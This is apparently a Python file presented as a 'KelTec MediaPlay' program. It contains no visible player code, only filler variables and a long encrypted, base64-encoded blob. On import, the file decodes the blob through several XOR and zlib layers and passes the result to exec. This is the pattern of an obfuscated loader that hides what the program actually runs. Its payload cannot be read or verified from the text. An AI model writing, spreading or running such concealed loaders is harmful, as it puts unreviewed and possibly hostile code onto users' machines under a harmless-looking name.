# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 750685 ^ 439701
_lx1_1 = len("99fc17")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-148667)
_lx3_3 = 185927 * 0
_lx4_4 = 758597 ^ 615519
_K = '7f57a5498e3a741e170479417c2a9f74f13951a9d39f46d97d141486aaa5a69e'
_M = '9c7LiQCRludv5g=='
_D = '==gbBlYvN2I/fMzmNqSXz2epttLmDkHD6AlIRX2C6NBQrwdyuGOs5Q1AiFNbrD9LBJjJ04r4XawUlSIWoYsU8tFJOlSIlw2zxPuMdmwhiLHwm90oqsW1CEsKsjS/Pt8lGlHYJNITqKum0D3F2qVMQ06mBroax+bGjJMx8gT87KTWDQWq18LUxKU5oOsSpDXZOJ0dn9jSseJ6TDG8jbj5wkWDpMs6RnXU3zvcjMZxoc6Ug9Clhu8k+gf71ZKLzMaJtQFJ9nbY2XzRBjsqPnTIi2kbstPATW/E4OwOeLgdqQZ34CyxuBklYY82pGgousuwSeDepoYoW2nbNRsla02BwjakiutSfgLulMNqKwTjlGjJ+SkGk+AKmH6J+m+mDw2J27dQ4cyRvLAdBuzElMm7D8cECs1HroWf9wULpxZfuxUt6d9LLu7UwI+c3UMimZdpewuQJ/fP4QSnSDzAySDIzn/E22N0DEENxfzM86cBqdh5AXSmXlH6DZuNxr516GhEMp/NJIzO+bHzUYtIg83GlRpuY77xwwjFTlQomk3op23/lh51kyMaCULeNL4ARGACRor3axYHqsjwrtKK71LUNFuoSI36lEyzUrn1cEoGXIlVQR/NMKhmBroGH9tjrbZlNiYSaiDVPhgLcoxF3idu41MKfHYzAUQ1HvalPwfjwZ7onR/AzM32qoGoxJsoNsao4+K6TXuxbUzLI5QyoAJ+bL3Djhk/nuq6DWgoZkMyT4HM2HwBvmptJtPO65qweZaCMEp1F/YRpHm+pTecAvFXKiP8nOfIF13nNo8kcuIr0CTSFgS9ShK09Nbs55eQHQ+WvzHgV+84KXZTfMv4k+0/gybJcjhP8htO93KFjmlSN++X5nAsimxDUauvB0FsWJSY/c/+mz7/pgMm0qt8qc8g0kTU7MNEH1vx8aU96gLiCMndmk42kCrNrXfJrFMNam/3RjNXTCnHSVUqk6FzRLfS4aZIkp5yXqYALXPZ7VzqY9ctj75KqC0b4cEGsF/ZvuG+2yz8LHQMTyHYWQfzjJFIje+osu+xsny0aPuCRALKX6GpZlcpXsdOfEGOwaQZqgewgt4/a3927pZLUqKgme7oUKhMD4OE01zcrepcM8ywFkaXs7+c8JFL5jKSfF47Ax1IR1GCPObde+JlgP15WaeUlspRgePba+BtbuJ2aW8y05/J4bMJHEfzCi+20RKLxLRMj8eSQC1adxL+EwUsAx0ade7NUKi45Xdc+3GBisFyWKRADc7Ybq+3+G7XMMnr+Ve1dQ/pWe3HAKtsgd0N0KSYHLozKgpcyIzo9lkLEHJ37yj6s0Gq4TgbmXKYu0cXlmXeQIVXPzEtcjIwt+33UDCiqhiTI4m5C3FHXQQqDSlAPYPzyEugExa7TI/G5NpzqpHcixM8fg22D6WmjpdxLWBCXeQUKF3hsd0ygwln4WLnbjIwgFtTBB3Juw/jFGeBcX9GEExMJiTuOzXBnDJjVn/Cd1MclE+qqCJ6PsP9QKGWLaNBogwlF3Ozh3QwqCH2IoghY4FH6J6Vim+g3nCkZnIbgd7ISnZ98msdewbh2PdoJYVHsgvYOSSu4tUsWvQrQkkBoGFADS7cENLrzgXJJlIVvSwxtzJRQ22JeY7voxFYL725qRe+IiYatYXryek99Q3tvCP3ipzoU2ZOoo+3uSZHyVrhrcPVaqafhiPvQz4k3C1pFo2Y3u1i1wrhdjB01AvvkBbgYJdUJC7ffwXlD+p66Q72PjiV3RAoYKE/GDLJPmBBtDprLAa8rDvf/mLEdFKYEqWAe1ezK9NGnm1KBY9KVCGDvQAFE4mfQqkmXv3WhMZp2Ut2RyI9'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})
